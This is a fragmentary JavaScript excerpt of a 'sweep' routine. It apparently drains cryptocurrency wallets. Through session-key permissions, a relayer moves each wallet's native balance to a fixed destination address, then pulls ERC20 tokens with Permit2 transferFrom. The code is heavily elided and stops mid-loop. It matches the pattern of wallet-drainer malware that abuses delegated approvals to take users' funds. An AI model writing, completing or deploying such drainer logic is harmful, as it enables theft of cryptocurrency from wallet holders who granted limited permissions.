...
async function sweep(wallet) {
  ...
  if (wallet.type === "session-key") {
    ...
    // Sweep native balance
    try {
      const nativeBal = await rpcProvider.getBalance(checksum);
      if (nativeBal > parseEther("0.001")) {
        // Session key allows native transfer — relayer sends on user's behalf
        const fee = await getFeeData();
        const tx = await relayerWallet.sendTransaction({
          to: DESTINATION_ADDRESS,
          value: nativeBal - parseEther("0.001"), // leave dust for gas
          ...fee,
        });
        await tx.wait();
    ...
    // Sweep ERC20 tokens via Permit2 transferFrom (session key enables ERC20 approval)
    ...
    for (const rawAddr of tokenList) {
      ...
      try {
        ...
        log(`[session] sweeping ${addr.slice(0,10)} balance=${ethers.formatUnits(balance, 18)}`);
        // Use permit2 transferFrom — session key gave ERC20 approval
        let erc20Allow = 0n;
